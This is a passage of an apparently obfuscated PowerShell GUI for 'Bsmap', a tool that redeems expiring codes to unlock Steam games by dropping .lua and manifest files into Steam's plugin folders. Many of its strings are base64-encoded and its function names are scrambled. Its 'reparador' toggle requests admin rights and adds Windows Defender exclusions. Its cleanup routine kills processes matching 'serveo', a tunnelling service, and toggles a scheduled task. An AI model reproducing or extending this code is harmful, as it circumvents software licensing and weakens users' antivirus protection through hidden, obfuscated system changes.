        $bg2=New-Object System.Drawing.SolidBrush($script:CardBG);$bp=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($bg2,$p);$g.DrawPath($bp,$p);$bg2.Dispose();$bp.Dispose();$p.Dispose()
        $gb2=New-Object System.Drawing.SolidBrush($script:Gray)
        $f1=New-Object System.Drawing.Font("Bahnschrift",9.5)
        $msg=T (S("c2luQ29kaWdvcw=="));$msz=$g.MeasureString($msg,$f1)
        $g.DrawString($msg,$f1,$gb2,($s.ClientSize.Width - $msz.Width)/2,12)
        $f2=New-Object System.Drawing.Font("Segoe UI",8)
        $msg2=T (S("c2luQ29kaWdvc1N1Yg=="));$msz2=$g.MeasureString($msg2,$f2)
        $g.DrawString($msg2,$f2,$gb2,($s.ClientSize.Width - $msz2.Width)/2,33)
        $gb2.Dispose();$f1.Dispose();$f2.Dispose();return
    }
    
    $ch2=86;$gp2=6;$yP=0
    foreach($c in $codes){
        $isPermanent = $c.Duration -eq 0
        if($isPermanent){$st="Permanente";$sc=$script:Green; $expStr = "Permanente"}
        else{
            
            $off = if ($script:clockOffsetSec) { $script:clockOffsetSec } else { 0 }
            $now = (Get-Date).AddSeconds(-$off)
            $exp = $c.ExpiresAt
            if($exp){
                $timeLeft = $exp - $now
                $totalSec = $timeLeft.TotalSeconds
                if($totalSec -le 0){$st=T "expirado";$sc=$script:Red}
                else{
                    
                    if ($totalSec -le 300) { $sc=$script:Red }            
                    elseif ($totalSec -le 1800) { $sc=$script:Orange }  
                    elseif ($totalSec -le 7200) { $sc=$script:Yellow } 
                    else { $sc=$script:Green }                          
                    
                    if ($totalSec -lt 60) { $st="Expira en $([int]$totalSec)s" }
                    elseif ($totalSec -lt 3600) { $st="Expira en $([int][math]::Floor($timeLeft.TotalMinutes))m" }
                    elseif ($totalSec -lt 86400) { $st="Expira en $([int][math]::Floor($timeLeft.TotalHours))h" }
                    else { $st="Expira en $([int][math]::Floor($timeLeft.TotalDays))d" }
                }
                
                $diasEsp = @('Dom','Lun','Mar','Mie','Jue','Vie','Sab')
                $expDisp = ConvertTo-ClockTime $exp
                $diaSem = $diasEsp[$expDisp.DayOfWeek.value__]
                $expStr = "$diaSem $($expDisp.ToString('dd/MM/yyyy HH:mm'))"
            } else {$st=T "activo";$sc=$script:Green; $expStr = "--/--/----"}
        }
        $cdStr=""
        $cdCol=$sc
        if($c.ExpiresAt){
            $tl2=($c.ExpiresAt - $now)
            if($tl2.TotalSeconds -le 0){$cdStr=(T "expirado");$cdCol=$script:Red}
            elseif($tl2.TotalDays -ge 1){$cdStr="Falta: $([math]::Floor($tl2.TotalDays))d $($tl2.Hours)h $($tl2.Minutes)m $($tl2.Seconds)s"}
            elseif($tl2.TotalHours -ge 1){$cdStr="Falta: $([int]$tl2.TotalHours)h $($tl2.Minutes)m $($tl2.Seconds)s"}
            else{$cdStr="Falta: $([int]$tl2.TotalMinutes)m $($tl2.Seconds)s"}
        }
        $p2=New-RR 0 $yP ($s.ClientSize.Width-1) $ch2 8
        $bg3=New-Object System.Drawing.SolidBrush($script:CardBG);$bp2=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($bg3,$p2);$g.DrawPath($bp2,$p2);$bg3.Dispose();$bp2.Dispose();$p2.Dispose()
        $hlp=New-Object System.Drawing.Pen($script:CardHover,1)
        $g.DrawLine($hlp,10,($yP+1),($s.ClientSize.Width-12),($yP+1));$hlp.Dispose()
        $dtBr=New-Object System.Drawing.SolidBrush($sc);$g.FillEllipse($dtBr,14,($yP+13),8,8);$dtBr.Dispose()
        $ctb=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($c.Code,$script:FntCodeT,$ctb,30,($yP+8));$ctb.Dispose()
        $gameLine="$($c.Games) juego(s)"
        $gtb=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($gameLine,$script:FntCodeS,$gtb,30,($yP+24));$gtb.Dispose()
        $etb=New-Object System.Drawing.SolidBrush($script:Gray)
        $g.DrawString("Expira: $expStr",$script:FntCodeS,$etb,30,($yP+40));$etb.Dispose()
        if($cdStr){
            $cdb=New-Object System.Drawing.SolidBrush($cdCol)
            $g.DrawString($cdStr,$script:FntCodeSt,$cdb,30,($yP+57));$cdb.Dispose()
        }
        $stb=New-Object System.Drawing.SolidBrush($sc);$stsz=$g.MeasureString($st,$script:FntCodeSt)
        $pillW=[int]$stsz.Width + 16;$pillX=($s.ClientSize.Width - $pillW - 10);$pillH=20
        $pillR=New-RR $pillX ($yP+4) $pillW $pillH 10
        $pillBr=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(45,$sc.R,$sc.G,$sc.B))
        $g.FillPath($pillBr,$pillR);$pillBr.Dispose();$pillR.Dispose()
        $g.DrawString($st,$script:FntCodeSt,$stb,($pillX + 8),($yP + 6));$stb.Dispose()
        $yP=($yP + $ch2 + $gp2)
    }
    $script:clpContentH=$yP
    $script:clpMaxScroll=[Math]::Max(0,($script:clpContentH - $s.ClientSize.Height))
    if($script:clpScroll -gt $script:clpMaxScroll){$script:clpScroll=$script:clpMaxScroll}
    $g.ResetTransform()
    if($script:clpMaxScroll -gt 0){
        $t=Get-ClpThumb
        $tr=New-RR $t.X 0 $t.W $s.ClientSize.Height 4
        $trBr=New-Object System.Drawing.SolidBrush($script:CardBorder)
        $g.FillPath($trBr,$tr);$trBr.Dispose();$tr.Dispose()
        $thumbBrush=New-Object System.Drawing.SolidBrush($script:Cyan)
        $thr=New-RR $t.X $t.Y $t.W $t.H 4
        $g.FillPath($thumbBrush,$thr);$thumbBrush.Dispose();$thr.Dispose()
    }
})
$script:rp.Controls.Add($script:clp)
$form.Controls.Add($script:rp)
$form.Add_MouseWheel({
    param($s,$e)
    if($script:rp.Visible -and $script:clpMaxScroll -gt 0){
        $pt=$script:rp.PointToClient([System.Windows.Forms.Cursor]::Position)
        if($pt.Y -ge 0 -and $pt.Y -le $script:rp.Height){
            $step=[int](($e.Delta / 120) * 50)
            $script:clpScroll=[Math]::Max(0,[Math]::Min($script:clpMaxScroll,($script:clpScroll - $step)))
            $script:clp.Invalidate();$e.Handled=$true
        }
    }
})


$script:sp=New-BufferedPanel
$script:sp.Location=New-Object System.Drawing.Point(0,$CY)
$script:sp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:sp.BackColor=$BG;$script:sp.Visible=$false
$script:sp.AutoScroll=$false
$script:sp.Padding=New-Object System.Windows.Forms.Padding(0,0,0,0)

$script:sBack=New-BufferedPanel
$script:sBack.Location=New-Object System.Drawing.Point($PAD,12)
$script:sBack.Size=New-Object System.Drawing.Size(32,32);$script:sBack.BackColor=$BG
$script:sBack.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sBack.Tag=@{Hover=$false}
$script:sBack.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sBack.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sBack.Add_Click({Switch-FromConfig})
$script:sBack.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $ap=New-Object System.Drawing.Pen($script:Cyan,2.5)
    $cx2=$s.Width/2;$cy2=$s.Height/2
    $g.DrawLine($ap,($cx2+4),($cy2-7),($cx2-4),$cy2)
    $g.DrawLine($ap,($cx2-4),$cy2,($cx2+4),($cy2+7));$ap.Dispose()
})
$script:sp.Controls.Add($script:sBack)

$script:sTitle=New-Object System.Windows.Forms.Label
$script:sTitle.Text=T "config"
$script:sTitle.Font=$script:FntRedeemTitle
$script:sTitle.ForeColor=$White;$script:sTitle.BackColor=$BG;$script:sTitle.AutoSize=$true
$script:sTitle.Location=New-Object System.Drawing.Point(([int]$PAD+42),14)
$script:sp.Controls.Add($script:sTitle)


$script:sVer=New-Object System.Windows.Forms.Label
$script:sVer.Text=$script:version
$script:sVer.Font=$FntSub
$script:sVer.ForeColor=$script:Gray
$script:sVer.BackColor=$BG
$script:sVer.AutoSize=$true
$script:sVer.Location=New-Object System.Drawing.Point(($FW-$PAD-40),20)
$script:sp.Controls.Add($script:sVer)


$sY=56
$script:cfgPage=1
$script:pageBtn1=New-Object System.Windows.Forms.Button
$script:pageBtn1.Text="Pagina 1";$script:pageBtn1.Location=New-Object System.Drawing.Point(($PAD+52),48);$script:pageBtn1.Size=New-Object System.Drawing.Size(80,22);$script:pageBtn1.BackColor=$script:CardBG;$script:pageBtn1.ForeColor=$White;$script:pageBtn1.FlatStyle="Flat";$script:pageBtn1.Font=$FntSub
$script:pageBtn2=New-Object System.Windows.Forms.Button
$script:pageBtn2.Text="Pagina 2";$script:pageBtn2.Location=New-Object System.Drawing.Point(($PAD+142),48);$script:pageBtn2.Size=New-Object System.Drawing.Size(80,22);$script:pageBtn2.BackColor=$script:CardBG;$script:pageBtn2.ForeColor=$White;$script:pageBtn2.FlatStyle="Flat";$script:pageBtn2.Font=$FntSub
$script:devLogVisible=$false
function Switch-CfgPage([int]$p){
 $script:cfgPage=$p
 $on1=($p -eq 1); $on2=($p -eq 2)
 $script:pageBtn1.BackColor=if($on1){$script:Cyan}else{$script:CardBG}
 $script:pageBtn1.ForeColor=if($on1){[System.Drawing.Color]::White}else{[System.Drawing.Color]::FromArgb(180,180,180)}
 $script:pageBtn2.BackColor=if($on2){$script:Cyan}else{$script:CardBG}
 $script:pageBtn2.ForeColor=if($on2){[System.Drawing.Color]::White}else{[System.Drawing.Color]::FromArgb(180,180,180)}
 @($script:sWatcher,$script:sHist,$script:sKill,$script:sPatch,$script:sDelGame) | ForEach-Object { if($_){$_.Visible=$on1} }
 if($null -ne $script:sLogLabel){$script:sLogLabel.Visible=($on1 -and $script:devLogVisible)}
 if($null -ne $script:sLogBox){$script:sLogBox.Visible=($on1 -and $script:devLogVisible)}
  @($script:sRepair,$script:sMigrar,$script:sAutoLua,$script:sDropsV2,$script:sDiag,$script:sPatch2) | ForEach-Object { if($_){$_.Visible=$on2} }
 if($null -ne $script:sFixDl){$script:sFixDl.Visible=$false}
 if($null -ne $script:sLuaTools){$script:sLuaTools.Visible=$false}
 if($null -ne $script:sLogLabel2){$script:sLogLabel2.Visible=($on2 -and $script:devLog2Visible)}
 if($null -ne $script:sLogBox2){$script:sLogBox2.Visible=($on2 -and $script:devLog2Visible)}
 $script:sp.Invalidate()
}
$script:pageBtn1.Add_Click({ Switch-CfgPage 1 })
$script:pageBtn2.Add_Click({ Switch-CfgPage 2 })
$script:sp.Controls.Add($script:pageBtn1)
$script:sp.Controls.Add($script:pageBtn2)
$script:modeBtn=New-Object System.Windows.Forms.Button
$script:modeBtn.Location=New-Object System.Drawing.Point(250,48);$script:modeBtn.Size=New-Object System.Drawing.Size(212,22);$script:modeBtn.FlatStyle="Flat";$script:modeBtn.Font=$FntSub
$script:modeBtn.Add_Click({
    $script:redeemParallel=-not $script:redeemParallel
    try{ New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name RedeemParallel -Value ([int]$script:redeemParallel) -Type DWord -Force }catch{}
    $script:modeBtn.Text=if($script:redeemParallel){"Canje: TODOS (cambiar)"}else{"Canje: 1x1 (cambiar)"}
    $script:modeBtn.BackColor=if($script:redeemParallel){$script:CardBG}else{[System.Drawing.Color]::FromArgb(45,35,15)}
})
$script:modeBtn.Text=if($script:redeemParallel){"Canje: TODOS (cambiar)"}else{"Canje: 1x1 (cambiar)"}
$script:modeBtn.BackColor=if($script:redeemParallel){$script:CardBG}else{[System.Drawing.Color]::FromArgb(45,35,15)}
$script:modeBtn.ForeColor=$script:Gray
$script:sp.Controls.Add($script:modeBtn)
$sY=78
function New-CfgBtn([int]$y,[string]$txt,[string]$sub,[scriptblock]$click,$accent){
    $pn=New-BufferedPanel
    $pn.Location=New-Object System.Drawing.Point($PAD,$y)
    $pn.Size=New-Object System.Drawing.Size($CW,50);$pn.BackColor=$BG
    $pn.Cursor=[System.Windows.Forms.Cursors]::Hand;$pn.Tag=@{Hover=$false;Txt=$txt;Sub=$sub;Accent=$accent}
    $pn.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
    $pn.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
    $pn.Add_Click($click)
    $pn.Add_Paint({param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
        $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
        if($n.Accent){ $bc=if($n.Hover){[System.Drawing.Color]::FromArgb(58,196,110)}else{$n.Accent} }
        $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
        $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
        $tw=New-Object System.Drawing.SolidBrush($script:White)
        $g.DrawString($n.Txt,$script:FntCard,$tw,14,7);$tw.Dispose()
        $sw=New-Object System.Drawing.SolidBrush($(if($n.Accent){[System.Drawing.Color]::FromArgb(232,250,238)}else{$script:Gray}))
        $g.DrawString($n.Sub,$script:FntSub,$sw,14,27);$sw.Dispose()
        $ab=New-Object System.Drawing.SolidBrush($(if($n.Accent){$script:White}else{$script:Cyan}))
        $asz=$g.MeasureString(">",$script:FntArrow)
        $g.DrawString(">",$script:FntArrow,$ab,$s.Width-$asz.Width-10,($s.Height-$asz.Height)/2);$ab.Dispose()
    })
    return $pn
}


$script:sWatcher=New-BufferedPanel
$script:sWatcher.Location=New-Object System.Drawing.Point($PAD,$sY)
$script:sWatcher.Size=New-Object System.Drawing.Size($CW,50);$script:sWatcher.BackColor=$BG
$script:sWatcher.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sWatcher.Tag=@{Hover=$false}
$script:sWatcher.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sWatcher.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sWatcher.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $we=$script:watcherEnabled
    $wp=$script:watcherProcess
    $he=if($wp){try{$wp.Refresh();$wp.HasExited}catch{$false}}else{$true}
    $wOn=$we -and $wp -and -not $he
    $st=if($wOn){(T (S("cmVwYXJhZG9yT24=")))}else{(T (S("cmVwYXJhZG9yT2Zm")))}
    $tw=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($st,$script:FntCard,$tw,14,7);$tw.Dispose()
    $sub=if($wOn){(S("Q2xpY2sgcGFyYSBkZXNhY3RpdmFyIGVsIHJlcGFyYWRvcg=="))}else{(S("Q2xpY2sgcGFyYSBhY3RpdmFyIGVsIHJlcGFyYWRvcg=="))}
    $sw=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($sub,$script:FntSub,$sw,14,27);$sw.Dispose()
    $clr=if($wOn){$script:Green}else{$script:Red}
    $dot=New-Object System.Drawing.SolidBrush($clr);$g.FillEllipse($dot,($s.Width-152),20,10,10);$dot.Dispose()
})
$script:sWatcher.Add_Click({
    $wRunning=$script:watcherProcess -and -not $script:watcherProcess.HasExited
    if ($wRunning) {
        try { $script:watcherProcess.Kill(); $script:watcherProcess.WaitForExit(2000) } catch {}
        $script:watcherProcess = $null; $script:watcherEnabled = $false
        Set-ReparadorFlag 0
        try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [TOGGLE] Reparador detenido por usuario" -Encoding UTF8 } catch {}
        [System.Windows.Forms.MessageBox]::Show((S("UmVwYXJhZG9yIGRlc2FjdGl2YWRvLg==")),(S("UmVwYXJhZG9y")),"OK","Information") | Out-Null
    } else {
        $msgResult = [System.Windows.Forms.MessageBox]::Show("Para activar el reparador se pedira permiso de administrador UNA sola vez.`n`nContinuar?",(S("QWN0aXZhciBSZXBhcmFkb3I=")),"YesNo","Information")
        if ($msgResult -ne "Yes") { $script:sWatcher.Invalidate(); return }
        [System.Windows.Forms.Application]::DoEvents()
        $exOk = Add-SteamDefenderExclusions
        if (-not $exOk) {
            [System.Windows.Forms.MessageBox]::Show((S("Tm8gc2UgcHVkbyBjb21wbGV0YXIgbGEgY29uZmlndXJhY2lvbiBkZWwgc2lzdGVtYS4gRWwgcmVwYXJhZG9yIHB1ZWRlIGZ1bmNpb25hciBpZ3VhbCBwZXJvIHNlcmEgbWVub3MgZWZpY2llbnRlLg==")),"Aviso","OK","Warning") | Out-Null
        }
        $started = Start-WatcherProcess
        if (-not $started) {
            [System.Windows.Forms.MessageBox]::Show("No se pudo iniciar el reparador. Revisa el log en $env:TEMP\bsmap_watcher.log","Error","OK","Error") | Out-Null
        } else {
            Set-ReparadorFlag 1
            [System.Windows.Forms.MessageBox]::Show((S("UmVwYXJhZG9yIGFjdGl2YWRvISBTZSBkZXRlY3RhcmFuIGp1ZWdvcyBhdXRvbWF0aWNhbWVudGUu")),(S("UmVwYXJhZG9yIEFjdGl2YWRv")),"OK","Information") | Out-Null
        }
    }
    $script:sWatcher.Invalidate()
})
$script:sp.Controls.Add($script:sWatcher)


$script:sHist=New-CfgBtn ($sY+58) (T (S("Ym9ycmFySGlzdA=="))) (T (S("Ym9ycmFySGlzdFN1Yg=="))) {
    if ([System.Windows.Forms.MessageBox]::Show("Se eliminaran TODOS los codigos del registro (active codes).`nEsto NO borra los juegos instalados.`n`nContinuar?",(S("Qm9ycmFyIGhpc3RvcmlhbA==")),"YesNo","Warning") -ne "Yes") { return }
    
    $script:activeCodes.Clear()
    
    St7Xb @()
    
    try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -Force -ErrorAction SilentlyContinue } catch {}
    
    try { Remove-Item -Path $HISTORY_FILE -Force -ErrorAction SilentlyContinue } catch {}
    
    RfC
    $script:rp.Invalidate()
    $script:clp.Invalidate()
    [System.Windows.Forms.Application]::DoEvents()
    
    $remaining = At5Vc
    if ($remaining.Count -gt 0) {
        
        St7Xb @()
        $script:activeCodes.Clear()
        try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -Force -ErrorAction SilentlyContinue } catch {}
    }
    RfC
    $script:rp.Invalidate()
    [System.Windows.Forms.MessageBox]::Show((T "histBorradoMsg"),(T "histBorrado"),"OK","Information")
}
$script:sp.Controls.Add($script:sHist)


$script:sKill=New-CfgBtn ($sY+116) (T "limpieza") (T (S("bGltcGllemFTdWI="))) {
    if ([System.Windows.Forms.MessageBox]::Show("LIMPIEZA TOTAL`n`n-Se eliminara el historial de codigos activos`n-Se restablecera el estado interno del programa`n-Se detendran y reiniciaran los servicios del programa`n`nContinuar?",(S("TElNUElFWkE=")),"YesNo","Warning") -ne "Yes") { return }
    
    $steamRoot = Get-SteamPath
    $allLibs = @($steamRoot)
    try { $allLibs = Ss3Jd } catch {}
    $cleanDirs = @((S("Y29uZmlnXHN0cGx1Zy1pbg==")), (S("Y29uZmlnXGx1YQ==")), "config\depotcache")
    $cleanupScript = {
        param($libs, $dirs)
        function Remove-OneHard([string]$p) {
            if ([string]::IsNullOrEmpty($p)) { return }
            try { if (Test-Path -LiteralPath $p) { [System.IO.File]::SetAttributes($p, [System.IO.FileAttributes]::Normal) } } catch {}
            try { if (Test-Path -LiteralPath $p) { Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue } } catch {}
            if (Test-Path -LiteralPath $p) { try { [System.IO.File]::Delete($p) } catch {} }
            if (Test-Path -LiteralPath $p) { try { [System.IO.File]::SetAttributes($p, [System.IO.FileAttributes]::Normal); Remove-Item -LiteralPath $p -Force -ErrorAction Stop } catch {} }
        }
        $removed = 0
        foreach ($lib in @($libs)) {
            if (-not $lib) { continue }
            foreach ($cd in @($dirs)) {
                $dir = Join-Path $lib $cd
                if (-not (Test-Path -LiteralPath $dir)) { continue }
                try {
                    foreach ($f in @(Get-ChildItem -LiteralPath $dir -File -ErrorAction SilentlyContinue)) {
                        $before = Test-Path -LiteralPath $f.FullName
                        Remove-OneHard $f.FullName
                        if ($before -and -not (Test-Path -LiteralPath $f.FullName)) { $removed++ }
                    }
                } catch {}
            }
        }
        return $removed
    }
    $totalRemoved = 0
    try { $totalRemoved = [int](Invoke-PsBlockingDoEvents $cleanupScript @($allLibs, $cleanDirs)) } catch { $totalRemoved = 0 }
    
    try { if ($script:cdT) { $script:cdT.Stop(); $script:cdT.Dispose(); $script:cdT = $null } } catch {}
    try { if ($script:rfT) { $script:rfT.Stop(); $script:rfT.Dispose(); $script:rfT = $null } } catch {}
    
    if ($script:watcherProcess -and -not $script:watcherProcess.HasExited) { try { $script:watcherProcess.Kill(); $script:watcherProcess.WaitForExit(3000) } catch {} }
    $script:watcherProcess = $null; $script:watcherEnabled = $false; Set-ReparadorFlag 0
    
    try {
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match (S("YnNtYXBfd2F0Y2hlcnxic21hcF9yZXBhcmFkb3I=")) } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "serveo" } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq (S("YnNtYXBfd2F0Y2guZXhl")) -or $_.CommandLine -match (S("YnNtYXBfd2F0Y2g=")) } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
        
        try { Disable-ScheduledTask -TaskName (S("QnNtYXBDbGVhbnVw")) -ErrorAction SilentlyContinue } catch {}
    } catch {}
    
    if ($script:fixJobs) { foreach ($j in $script:fixJobs.Values) { try { if ($j.job) { Stop-Job $j.job -ErrorAction SilentlyContinue; Remove-Job $j.job -Force -ErrorAction SilentlyContinue } } catch {} } }
    try { if ($script:fixesJob) { Stop-Job $script:fixesJob -ErrorAction SilentlyContinue; Remove-Job $script:fixesJob -Force -ErrorAction SilentlyContinue } } catch {}
    if ($script:downloadPendingFixes) { foreach ($d in $script:downloadPendingFixes.Values) { try { if ($d.dlJob) { Stop-Job $d.dlJob -ErrorAction SilentlyContinue; Remove-Job $d.dlJob -Force -ErrorAction SilentlyContinue } } catch {} } }
    
    St7Xb @()
    $script:activeCodes.Clear()
    try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -Path $HISTORY_FILE -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -LiteralPath $script:LOTEQ_FILE -Force -ErrorAction SilentlyContinue } catch {}
    $script:cdCode=$null; $script:cdPaused=$false; $script:cdRunning=$false; $script:clpGroups=@()
    try { if($script:cdp){ $script:cdp.Visible=$false } } catch {}
    
    $remaining = At5Vc
    if ($remaining.Count -gt 0) { St7Xb @(); $script:activeCodes.Clear() }
    
    try { Enable-ScheduledTask -TaskName (S("QnNtYXBDbGVhbnVw")) -ErrorAction SilentlyContinue } catch {}
    
    ScA; RfC; $script:rp.Invalidate(); $script:sWatcher.Invalidate()
    [System.Windows.Forms.Application]::DoEvents()
    [System.Windows.Forms.MessageBox]::Show("Limpieza completada.`n- Historial de codigos eliminado`n- Servicios internos reiniciados",(S("TElNUElFWkEgQ09NUExFVEFEQQ==")),"OK","Information")
}
$script:sp.Controls.Add($script:sKill)


$script:sPatch=New-CfgBtn ($sY+174) "Solucionar activacion" "Si tienes un problema con la activacion, presiona aqui" {
    if ([System.Windows.Forms.MessageBox]::Show("Si tienes un problema con la activacion, este boton lo solucionara.`nSe pedira permiso de admin si es necesario y Steam se reiniciara.`n`nContinuar?","Solucionar activacion","YesNo","Information") -ne "Yes") { return }
    [System.Windows.Forms.Application]::DoEvents()
    $ok = Xz9Qk
    if ($ok) { [System.Windows.Forms.MessageBox]::Show("Activacion reparada. Steam se esta abriendo.","Solucionar activacion","OK","Information") }
    else { [System.Windows.Forms.MessageBox]::Show("No se pudo reparar la activacion. Verifica tu conexion o revisa el log.","Solucionar activacion","OK","Error") }
}
$script:sp.Controls.Add($script:sPatch)

$script:sDelGame=New-CfgBtn ($sY+232) "Eliminar juego/juegos" "Elige que juegos borrar por nombre" {
    try {
        $luas=@(); $srTmp=$null; try { $srTmp=Get-SteamPath } catch {}
        try { $luas+=@(Get-ChildItem (Join-Path $srTmp (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) -Filter *.lua -ErrorAction SilentlyContinue | Select-Object -ExpandProperty BaseName) } catch {}
        try { $luas+=@(Get-ChildItem (Join-Path $srTmp (S("Y29uZmlnXGx1YQ=="))) -Filter *.lua -ErrorAction SilentlyContinue | Select-Object -ExpandProperty BaseName) } catch {}
        $luas=$luas | Sort-Object -Unique
        if (-not $luas -or $luas.Count -eq 0) { [System.Windows.Forms.MessageBox]::Show("No hay juegos instalados para borrar.","Eliminar juego","OK","Information"); return }
        $instM=$null; try { $instM=Get-InstallFolderMap } catch {}
        $allRows=New-Object System.Collections.ArrayList
        foreach ($lid in $luas) {
            $mf=@(); try { $mf=@(Get-ChildItem (Join-Path $srTmp "config\depotcache") -Filter "$lid*.manifest" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name) } catch {}
            $nm=Get-GameNameByAppId $lid
            if ($nm -eq $lid -and $instM -and $instM.ContainsKey($lid)) { $nm=$instM[$lid] }
            [void]$allRows.Add([PSCustomObject]@{ AppId="$lid"; Name="$nm"; Timer=@{game_name=$lid; lua_files=@("$lid.lua"); manifest_files=@($mf); steam_root=$srTmp} })
        }
        $allRows=@($allRows | Sort-Object Name)
        $formDel=New-Object System.Windows.Forms.Form
        $formDel.Text="Eliminar juegos"; $formDel.ClientSize=New-Object System.Drawing.Size(500,520)
        $formDel.StartPosition="CenterParent"; $formDel.FormBorderStyle="FixedSingle"
        $formDel.MaximizeBox=$false; $formDel.MinimizeBox=$false; $formDel.BackColor=$script:BG
        try { $formDel.Icon=$form.Icon } catch {}
        $lblDel=New-Object System.Windows.Forms.Label
        $lblDel.Text="Busca por nombre y marca los juegos a borrar:"; $lblDel.Font=$script:FntCard
        $lblDel.ForeColor=$script:White; $lblDel.BackColor=$script:BG
        $lblDel.Location=New-Object System.Drawing.Point(12,12); $lblDel.AutoSize=$true
        $formDel.Controls.Add($lblDel)
        $txtSearch=New-Object System.Windows.Forms.TextBox
        $txtSearch.Location=New-Object System.Drawing.Point(12,40); $txtSearch.Size=New-Object System.Drawing.Size(460,26)
        $txtSearch.BackColor=$script:InputBG; $txtSearch.ForeColor=$script:White; $txtSearch.BorderStyle="FixedSingle"
        $txtSearch.Font=$script:FntCard
        $formDel.Controls.Add($txtSearch)
        $lvDel=New-Object System.Windows.Forms.ListView
        $lvDel.Location=New-Object System.Drawing.Point(12,74); $lvDel.Size=New-Object System.Drawing.Size(460,356)
        $lvDel.View="Details"; $lvDel.CheckBoxes=$true; $lvDel.FullRowSelect=$true
        $lvDel.BackColor=$script:InputBG; $lvDel.ForeColor=$script:White; $lvDel.BorderStyle="FixedSingle"
        $lvDel.HeaderStyle="None"
        [void]$lvDel.Columns.Add("Juego",436)
        $rebuildDel={
            $q=($txtSearch.Text).Trim()
            $qNorm=Nn1Yw $q
            $isNum=($q -match '^\d+$')
            $prev=@{}
            foreach ($vi in @($lvDel.Items)) { if ($vi.Checked) { $prev[[string]$vi.Tag.AppId]=$true } }
            $lvDel.BeginUpdate(); $lvDel.Items.Clear()
            foreach ($row in $allRows) {
                if ($qNorm) {
                    if ($isNum) { if (-not ($row.AppId -like "*$q*")) { continue } }
                    else {
                        $nmN=Nn1Yw $row.Name
                        if (-not ($nmN -like "*$qNorm*" -or $qNorm -like "*$nmN*")) { continue }
                    }
                }
                $ni=New-Object System.Windows.Forms.ListViewItem([string]$row.Name)
                $ni.Tag=$row
                if ($prev.ContainsKey([string]$row.AppId)) { $ni.Checked=$true }
                [void]$lvDel.Items.Add($ni)
            }
            $lvDel.EndUpdate()
        }
        $txtSearch.Add_TextChanged({ try { & $rebuildDel } catch {} })
        & $rebuildDel
        $btnOk=New-Object System.Windows.Forms.Button
        $btnOk.Text="Borrar seleccionados"; $btnOk.Location=New-Object System.Drawing.Point(12,444); $btnOk.Size=New-Object System.Drawing.Size(220,32)
        $btnOk.BackColor=$script:Red; $btnOk.ForeColor=[System.Drawing.Color]::White; $btnOk.FlatStyle="Flat"; $btnOk.FlatAppearance.BorderSize=0; $btnOk.Font=$script:FntCard; $btnOk.Cursor=[System.Windows.Forms.Cursors]::Hand
        $btnCancel=New-Object System.Windows.Forms.Button
